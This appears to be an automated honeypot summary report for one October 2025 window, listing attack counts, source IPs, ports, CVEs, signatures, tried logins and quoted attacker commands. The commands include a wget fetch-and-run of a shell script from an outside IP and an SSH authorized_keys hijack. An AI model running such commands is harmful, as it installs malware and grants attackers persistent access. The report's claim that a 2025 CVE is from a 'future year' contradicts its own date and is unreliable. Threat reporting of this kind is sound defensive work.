# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-17T14:01:44Z
**Timeframe:** 2025-10-17T13:20:01Z to 2025-10-17T14:00:01Z
**Files Used:**
- agg_log_20251017T132001Z.json
- agg_log_20251017T134001Z.json
- agg_log_20251017T140001Z.json

## Executive Summary

This report summarizes 15,215 attacks recorded across the honeypot network. The majority of attacks were SSH brute-force attempts, with significant activity also targeting networking devices (Ciscoasa) and VoIP systems (Sentrypeer on port 5060). Attackers were observed attempting to download and execute malicious scripts, add their own SSH keys for persistent access, and perform system reconnaissance. The IP `96.44.159.120` was the most active attacker in this period.

## Detailed Analysis

### Attacks by Honeypot
- Cowrie: 6,710
- Honeytrap: 2,875
- Suricata: 1,479
- Ciscoasa: 1,475
- Sentrypeer: 1,165
- Dionaea: 999
- Redishoneypot: 119
- Tanner: 107
- H0neytr4p: 65
- Mailoney: 58
- Miniprint: 46
- Adbhoney: 23
- Dicompot: 15
- ConPot: 12
- Honeyaml: 9
- Ipphoney: 1

### Top Attacking IPs
- 96.44.159.120
- 72.146.232.13
- 178.128.232.91
- 186.10.24.214
- 172.86.95.115
- 172.86.95.98
- 167.172.34.68

### Top Targeted Ports/Protocols
- 22 (SSH)
- 5060 (SIP)
- 445 (SMB)
- 5903 (VNC)
- 80 (HTTP)
- 8333 (Bitcoin)
- 6379 (Redis)

### Most Common CVEs
- CVE-2001-0414
- CVE-2025-57819
- CVE-2006-3602
- CVE-2006-4458
- CVE-2006-4542
- CVE-2002-0013
- CVE-2002-0012

### Commands Attempted by Attackers
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `uname -a`
- `whoami`
- `cd /data/local/tmp/; busybox wget http://31.97.160.189/w.sh; sh w.sh; curl ...`

### Signatures Triggered
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET FTP FTP PWD command attempt without login
- ET INFO Reserved Internal IP Traffic
- ET INFO CURL User Agent

### Users / Login Attempts
- root/techsupport
- 345gs5662d34/345gs5662d34
- nobody/444444
- test/test2016
- supervisor/supervisor2007
- support/qwerty12345

### Files Uploaded/Downloaded
- w.sh
- c.sh
- wget.sh
- clean.sh
- setup.sh
- json

### HTTP User-Agents
- Not observed in this period.

### SSH Clients and Servers
- Not observed in this period.

### Top Attacker AS Organizations
- Not observed in this period.

## Key Observations and Anomalies

- **Persistent SSH Key Installation:** A recurring pattern involves attackers attempting to remove existing SSH configurations and install their own public key (`ssh-rsa AAAAB3...`). This indicates a clear objective of gaining persistent, passwordless access to compromised systems.
- **Malware Delivery:** The command `cd /data/local/tmp/; busybox wget http://31.97.160.189/w.sh; ...` shows a direct attempt to download and execute malware from a specific IP address. This suggests a more automated and targeted attack campaign.
- **VoIP Targeting:** The high number of attacks on port 5060 (SIP) indicates a continued interest in compromising VoIP systems, likely for toll fraud or eavesdropping.
- **Unusual CVE:** The presence of `CVE-2025-57819` is anomalous, as it refers to a future year. This is likely a placeholder or a misconfiguration in the attacking tool or the honeypot's logging.
